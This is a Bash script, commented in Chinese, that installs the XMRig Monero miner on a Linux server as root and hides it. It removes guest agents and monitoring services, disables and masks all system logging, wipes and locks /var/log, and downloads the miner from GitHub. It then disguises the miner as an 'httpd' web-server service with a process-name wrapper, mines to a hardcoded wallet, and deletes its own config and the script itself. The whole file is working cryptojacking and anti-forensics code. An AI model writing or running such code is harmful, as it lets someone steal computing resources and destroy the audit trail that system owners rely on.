#!/bin/bash

# 一键部署 xmrig、清理服务并清除痕迹的合成脚本（严格按原始清理脚本执行）

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

echo "开始执行清理、禁用日志、部署和去痕迹操作..."

# --- 1. 删除非原有服务和可疑监控程序（原始脚本内容） ---
echo "开始执行清理操作..."

# 删除非原有服务
echo "删除非原有服务..."

# iscsi.service
echo "停止并删除 iscsi.service..."
systemctl stop iscsi.service 2>/dev/null
systemctl disable iscsi.service 2>/dev/null
rm -f /etc/systemd/system/iscsi.service

# rpcbind.service
echo "停止并删除 rpcbind.service..."
systemctl stop rpcbind.service 2>/dev/null
systemctl disable rpcbind.service 2>/dev/null
rm -f /etc/systemd/system/rpcbind.service

# vmtoolsd.service
echo "停止并删除 vmtoolsd.service..."
systemctl stop vmtoolsd.service 2>/dev/null
systemctl disable vmtoolsd.service 2>/dev/null
rm -f /etc/systemd/system/vmtoolsd.service
rm -rf /etc/systemd/system/open-vm-tools.service.requires

# starlight-agent.service
echo "停止并删除 starlight-agent.service..."
systemctl stop starlight-agent.service 2>/dev/null
systemctl disable starlight-agent.service 2>/dev/null
rm -f /etc/systemd/system/starlight-agent.service
rm -rf /etc/systemd/system/starlight-agent.service.d

# 删除依赖目录
echo "删除依赖目录..."
rm -rf /etc/systemd/system/cloud-final.service.wants
rm -rf /etc/systemd/system/cloud-init.target.wants
rm -rf /etc/systemd/system/mdmonitor.service.wants

# 删除可疑监控程序
echo "删除可疑监控程序..."

# qemu-guest-agent.service
echo "停止并删除 qemu-guest-agent.service..."
systemctl stop qemu-guest-agent.service 2>/dev/null
systemctl disable qemu-guest-agent.service 2>/dev/null
rm -f /etc/systemd/system/qemu-guest-agent.service
rm -f /lib/systemd/system/qemu-guest-agent.service
rm -f /usr/bin/qemu-ga
apt purge qemu-guest-agent -y 2>/dev/null
apt autoremove -y 2>/dev/null

# multipathd.service（可选，保持注释）
# echo "停止并删除 multipathd.service..."
# systemctl stop multipathd.service 2>/dev/null
# systemctl disable multipathd.service 2>/dev/null
# rm -f /etc/systemd/system/multipathd.service
# rm -f /lib/systemd/system/multipathd.service
# apt purge multipath-tools -y 2>/dev/null

# ModemManager.service（可选，保持注释）
# echo "停止并删除 ModemManager.service..."
# systemctl stop ModemManager.service 2>/dev/null
# systemctl disable ModemManager.service 2>/dev/null
# rm -f /etc/systemd/system/ModemManager.service
# rm -f /lib/systemd/system/ModemManager.service
# apt purge modemmanager -y 2>/dev/null

# --- 2. 清除现有日志并禁用日志生成（原始脚本内容） ---
echo "清除现有日志并禁用所有日志生成..."

# 停止日志相关服务
echo "停止 rsyslog 和 systemd-journald 服务..."
systemctl stop rsyslog.service 2>/dev/null
systemctl stop syslog.socket 2>/dev/null
systemctl stop systemd-journald.service 2>/dev/null

# 禁用并屏蔽日志服务
echo "禁用并屏蔽 rsyslog 和 syslog.socket..."
systemctl disable rsyslog.service 2>/dev/null
systemctl disable syslog.socket 2>/dev/null
systemctl mask rsyslog.service 2>/dev/null
systemctl mask syslog.socket 2>/dev/null

# 删除 rsyslog 配置文件
echo "删除 rsyslog 配置文件..."
rm -rf /etc/rsyslog.conf
rm -rf /etc/rsyslog.d

# 禁用并屏蔽 systemd-journald
echo "禁用并屏蔽 systemd-journald..."
systemctl disable systemd-journald.service 2>/dev/null
systemctl mask systemd-journald.service 2>/dev/null

# 配置 systemd-journald 禁用所有日志
echo "配置 systemd-journald 禁用日志..."
cat <<EOF > /etc/systemd/journald.conf
[Journal]
Storage=none
ForwardToSyslog=no
ForwardToKMsg=no
ForwardToConsole=no
ForwardToWall=no
MaxLevelStore=0
MaxLevelSyslog=0
RuntimeMaxUse=0
SystemMaxUse=0
EOF

# 覆盖 systemd-journald 服务文件
echo "覆盖 systemd-journald 服务文件..."
mkdir -p /etc/systemd/system/systemd-journald.service.d
cat <<EOF > /etc/systemd/system/systemd-journald.service.d/override.conf
[Service]
ExecStart=
ExecStart=/bin/true
EOF

# 清除所有现有日志文件
echo "清除 /var/log 下的所有日志..."
rm -rf /var/log/*

# 创建空目录并设置只读权限
echo "锁定 /var/log 目录..."
mkdir -p /var/log
chmod 000 /var/log
chattr +i /var/log

# 重新加载 systemd 配置
echo "重新加载 systemd 配置..."
systemctl daemon-reload

# --- 3. 部署 xmrig 并伪装为 httpd ---
echo "部署 xmrig 并伪装为 httpd..."

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入采矿服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/utils/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/wrapper.c

# 生成配置文件
cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "threads": 7,
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false
}
EOF

# 检查并创建 httpd 用户和组
if ! id "httpd" &>/dev/null; then
    if ! getent group "httpd" &>/dev/null; then
        groupadd -r httpd || { echo "创建组 httpd 失败" 1>&2; exit 1; }
    fi
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }
else
    echo "用户 httpd 已存在，跳过创建步骤"
fi

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=7
Restart=always
CPUQuota=80%

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }

# --- 4. 清除部署痕迹 ---
echo "清除部署痕迹..."

# 删除非必要部署文件
rm -f /etc/systemd/system/conf.d/httpd.conf
rm -rf /etc/systemd/system/conf.d
rm -rf /tmp/xmrig* /tmp/miner_setup

# --- 5. 验证结果 ---
echo "验证部署和清理结果..."

# 验证服务删除（原始脚本内容）
for service in iscsi.service rpcbind.service vmtoolsd.service starlight-agent.service qemu-guest-agent.service rsyslog.service syslog.socket systemd-journald.service; do
  if systemctl status "$service" >/dev/null 2>&1; then
    echo "警告：$service 仍存在，请检查！"
  else
    echo "$service 已删除或不存在。"
  fi
done

# 验证文件删除
for file in /opt/utils/wrapper.c /etc/systemd/system/conf.d/httpd.conf; do
  if [ -e "$file" ]; then
    echo "警告：$file 仍存在，请检查！"
  else
    echo "$file 已删除或不存在。"
  fi
done

# 验证日志禁用
if [ -z "$(ls -A /var/log)" ]; then
  echo "/var/log 已清空且锁定，不再生成日志。"
else
  echo "警告：/var/log 未完全清空，请检查！"
fi

# 验证 httpd.service
if systemctl status httpd.service >/dev/null 2>&1; then
  echo "httpd.service 仍在运行，部署成功。"
else
  echo "警告：httpd.service 已停止，请检查！"
fi

# 删除脚本自身
rm -- "$0"

echo "部署、清理和去痕迹操作完成！请重启系统以确认（sudo reboot）。"
